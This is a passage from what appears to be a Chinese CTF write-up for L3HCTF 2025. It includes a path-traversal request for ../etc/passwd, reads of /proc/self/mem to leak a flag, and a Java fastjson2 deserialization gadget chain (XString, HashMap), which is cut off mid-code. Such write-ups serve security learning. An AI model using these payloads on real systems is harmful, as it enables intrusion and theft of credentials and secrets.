</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>/download?&amp;a0=0&amp;a1=1&amp;a2=2&amp;a3=3&amp;a4=4&amp;a5=5&amp;a6=6&amp;a7=7&amp;a8=8&amp;a9=9&amp;a10=10&amp;a11=11&amp;a12=12&amp;a13=13&amp;a14=14&amp;a15=15&amp;a16=16&amp;a17=17&amp;a18=18&amp;a19=19&amp;a20=20&amp;a21=21&amp;a22=22&amp;a23=23&amp;a24=24&amp;a25=25&amp;a26=26&amp;a27=27&amp;a28=28&amp;a29=29&amp;a30=30&amp;a31=31&amp;a32=32&amp;a33=33&amp;a34=34&amp;a35=35&amp;a36=36&amp;a37=37&amp;a38=38&amp;a39=39&amp;a40=40&amp;a41=41&amp;a42=42&amp;a43=43&amp;a44=44&amp;a45=45&amp;a46=46&amp;a47=47&amp;a48=48&amp;a49=49&amp;a50=50&amp;a51=51&amp;a52=52&amp;a53=53&amp;a54=54&amp;a55=55&amp;a56=56&amp;a57=57&amp;a58=58&amp;a59=59&amp;a60=60&amp;a61=61&amp;a62=62&amp;a63=63&amp;a64=64&amp;a65=65&amp;a66=66&amp;a67=67&amp;a68=68&amp;a69=69&amp;a70=70&amp;a71=71&amp;a72=72&amp;a73=73&amp;a74=74&amp;a75=75&amp;a76=76&amp;a77=77&amp;a78=78&amp;a79=79&amp;a80=80&amp;a81=81&amp;a82=82&amp;a83=83&amp;a84=84&amp;a85=85&amp;a86=86&amp;a87=87&amp;a88=88&amp;a89=89&amp;a90=90&amp;a91=91&amp;a92=92&amp;a93=93&amp;a94=94&amp;a95=95&amp;a96=96&amp;a97=97&amp;a98=98&amp;a=information_schemas&amp;filename=../etc/passwd
</span></span></code></pre></td></tr></table></div></div><p>对于此处的过滤</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Go data-lang=Go><span class=line><span class=cl><span class=nx>proxy_pass</span> <span class=nx>http</span><span class=p>:</span><span class=c1>//127.0.0.1/static$arg_filename;</span>
</span></span><span class=line><span class=cl><span class=nx>body_filter_by_lua_block</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>local</span> <span class=nx>blacklist</span> <span class=p>=</span> <span class=p>{</span><span class=s>&#34;flag&#34;</span><span class=p>,</span> <span class=s>&#34;l3hsec&#34;</span><span class=p>,</span> <span class=s>&#34;l3hctf&#34;</span><span class=p>,</span> <span class=s>&#34;password&#34;</span><span class=p>,</span> <span class=s>&#34;secret&#34;</span><span class=p>,</span> <span class=s>&#34;confidential&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>b</span> <span class=nx>in</span> <span class=nf>ipairs</span><span class=p>(</span><span class=nx>blacklist</span><span class=p>)</span> <span class=nx>do</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=kt>string</span><span class=p>.</span><span class=nf>find</span><span class=p>(</span><span class=nx>ngx</span><span class=p>.</span><span class=nx>arg</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nx>b</span><span class=p>)</span> <span class=nx>then</span>
</span></span><span class=line><span class=cl>            <span class=nx>ngx</span><span class=p>.</span><span class=nx>arg</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>=</span> <span class=kt>string</span><span class=p>.</span><span class=nf>rep</span><span class=p>(</span><span class=s>&#34;*&#34;</span><span class=p>,</span> <span class=kt>string</span><span class=p>.</span><span class=nb>len</span><span class=p>(</span><span class=nx>ngx</span><span class=p>.</span><span class=nx>arg</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>            <span class=nx>end</span>
</span></span><span class=line><span class=cl>        <span class=nx>end</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Range 头是 HTTP 协议中用于请求部分内容的请求头，格式为：</p><blockquote><p>Range: bytes=[start]-[end]</p><p>允许客户端指定需要获取的资源字节范围，实现断点续传和分块下载功能。</p></blockquote><p><img src=https://su-team.cn/img/2025-L3HCTF/64b86e56-6d44-4532-8aa1-f2f91eeae5c5.png alt=img></p><p>首先利用此方法遍历文件描述符在 /proc/1/fd/6 找到 password 为<code>passwordismemeispasswordsoneverwannagiveyouup</code></p><p>然后可以先通过<code>/proc/self/maps</code>获得当前进程虚拟地址映射</p><p><img src=https://su-team.cn/img/2025-L3HCTF/c12f8782-5fe4-424c-b894-162e22a108cb.png alt=img></p><p>在本地环境 nginx.conf 的初始化代码后面加上一段，获取 flag 变量的地址</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Lua data-lang=Lua><span class=line><span class=cl><span class=n>init_by_lua_block</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>#</span> <span class=err>在最后加上一段</span>
</span></span><span class=line><span class=cl>        <span class=n>print</span><span class=p>(</span><span class=n>tostring</span><span class=p>(</span><span class=n>flag</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=kd>local</span> <span class=n>ffi</span> <span class=o>=</span> <span class=n>require</span><span class=p>(</span><span class=s2>&#34;ffi&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=kd>local</span> <span class=n>ptr</span> <span class=o>=</span> <span class=n>ffi.cast</span><span class=p>(</span><span class=s2>&#34;const char*&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>print</span><span class=p>(</span><span class=s2>&#34;Address: &#34;</span><span class=p>,</span> <span class=n>tostring</span><span class=p>(</span><span class=n>ptr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>找到 flag 存储在 /dev/zero 的下一段内存中</p><p>读取 /proc/self/mem 中对应的内存，搜索 &lsquo;L3H&rsquo; 即可获得 flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>GET /read_anywhere HTTP/1.1
</span></span><span class=line><span class=cl>Host: Your_host
</span></span><span class=line><span class=cl>X-Gateway-Password: test_password
</span></span><span class=line><span class=cl>X-Gateway-Filename: /proc/self/mem
</span></span><span class=line><span class=cl>X-Gateway-Start: 0x7e07636f3000
</span></span><span class=line><span class=cl>X-Gateway-Length: 0x100000
</span></span></code></pre></td></tr></table></div></div><h2 id=tellmewhy>Tellmewhy</h2><p>一道java题，solon框架，存在fastjson2依赖</p><p><img src=https://su-team.cn/img/2025-L3HCTF/58ce9bd7-c3a4-402c-9cf4-f51a6c49a316.png alt=img></p><p>/baby/way 路由存在反序列化点</p><p><img src=https://su-team.cn/img/2025-L3HCTF/f51300e2-7447-483a-a66e-0b2dbdeb182a.png alt=img></p><p>自定义objectStream中定义了反序列化黑名单</p><ul><li>javax.management.BadAttributeValueExpException</li><li>javax.swing.event.EventListenerList</li><li>javax.swing.UIDefaults$TextAndMnemonicHashMap</li></ul><p>目的应该是想过滤hashmap -> fastjson2.JSONArray中的链子，不管是通过经验还是跑一下tabby都能发现还有XString这个可用的链子</p><p><img src=https://su-team.cn/img/2025-L3HCTF/80313d59-c466-4877-9542-8f492b4c9f7b.png alt=img></p><p>基于这个构造出基础payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>com.alibaba.fastjson2.JSONObject</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Array</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Constructor</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xpath.internal.objects.XString</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Test2</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TestObj</span><span class=w> </span><span class=n>testObj</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TestObj</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>JSONObject</span><span class=w> </span><span class=n>jsonObject1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>JSONObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>jsonObject1</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;g&#34;</span><span class=p>,</span><span class=w> </span><span class=n>testObj</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>XString</span><span class=w> </span><span class=n>xs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>XString</span><span class=p>(</span><span class=s>&#34;\n&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=w> </span><span class=n>hashMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=w> </span><span class=n>hashMap2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hashMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;yy&#34;</span><span class=p>,</span><span class=n>jsonObject1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hashMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;zZ&#34;</span><span class=p>,</span><span class=w> </span><span class=n>xs</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hashMap2</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;yy&#34;</span><span class=p>,</span><span class=n>xs</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hashMap2</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;zZ&#34;</span><span class=p>,</span><span class=n>jsonObject1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>makeMap</span><span class=p>(</span><span class=n>hashMap</span><span class=p>,</span><span class=w> </span><span class=n>hashMap2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>serialize</span><span class=p>(</span><span class=n>obj</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>unserialize</span><span class=p>(</span><span class=s>&#34;ser.bin&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setFieldValue</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>field</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>obj</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=n>field</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>serialize</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>oos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FileOutputStream</span><span class=p>(</span><span class=s>&#34;ser.bin&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>oos</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>obj</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>oos</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>unserialize</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>Filename</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>ois</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FileInputStream</span><span class=p>(</span><span class=n>Filename</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ois</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>obj</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>HashMap</span><span class=w> </span><span class=nf>makeMap</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>v1</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>v2</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=w> </span><span class=n>s</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=s>&#34;size&#34;</span><span class=p>,</span><span class=w> </span><span class=n>2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=w> </span><span class=n>nodeC</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>nodeC</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;java.util.HashMap$Node&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>nodeC</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;java.util.HashMap$Entry&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=w> </span><span class=n>nodeCons</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>nodeC</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=kt>int</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>nodeC</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>nodeCons</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>tbl</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Array</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>nodeC</span><span class=p>,</span><span class=w> </span><span class=n>2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Array</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>tbl</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>nodeCons</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>v1</span><span class=p>,</span><span class=w> </span><span class=n>v1</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Array</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>tbl</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>nodeCons</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>v2</span><span class=p>,</span><span class=w> </span><span class=n>v2</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=s>&#34;table&#34;</span><span class=p>,</span><span class=w> </span><span class=n>tbl</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>s</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>fastjson2 与 fastjson1 机制上不太一样，通过fastjson2 构造反序列化链触发templates会进入黑名单，常见的打法是需要通过代理类进行处理，这部分详细内容可通过下述链接学习：</p><ul><li><a href=https://mp.weixin.qq.com/s/gl8lCAZq-8lMsMZ3_uWL2Q>https://mp.weixin.qq.com/s/gl8lCAZq-8lMsMZ3_uWL2Q</a></li><li><a href=https://github.com/Ape1ron/FastjsonInDeserializationDemo1#>https://github.com/Ape1ron/FastjsonInDeserializationDemo1#</a></li></ul><p>出题人在赛题中也贴心的直接给出了可以使用的代理类org.example.demo.Utils.MyProxy</p><p><img src=https://su-team.cn/img/2025-L3HCTF/5f8b27e1-24a3-4b12-a436-64107531231c.png alt=img></p><p>在有这个类的基础上就可以编写出完整的poc</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span><span class=lnt>95
</span><span class=lnt>96
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xpath.internal.objects.XString</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>common.Reflections</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>common.Util</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>gadgets.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.example.demo.Utils.MyObject</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.naming.spi.ObjectFactory</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.xml.transform.Templates</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Base64</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Map</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
